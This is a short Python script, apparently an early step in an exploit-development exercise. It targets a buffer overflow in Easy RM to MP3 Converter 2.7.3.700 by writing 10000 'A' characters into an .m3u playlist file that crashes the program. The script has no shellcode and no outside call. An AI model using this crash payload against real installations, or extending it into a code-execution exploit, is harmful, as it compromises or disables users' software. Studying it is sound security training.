######################################################### 

##      Easy RM to MP3 Converter Buffer Overflow       ## 

##            Ver 2.7.3.700 29 Sept 2006               ##       

##                  Exploit V-00                       ## 

######################################################### 


### Initialize a large variable 'junk' to overflow the buffer \x41 is A
### Increment the number until it crashs the app, go beyond this by 10000 to make sure it still crashes
junk = '\x41' * 10000 
  
### Build the buffer 
buffer = junk 

### Output the contents of the 'buffer' variable to the terminal 
### Use python [exploit_script].py > [version]-exploit.m3u 

print(buffer) 
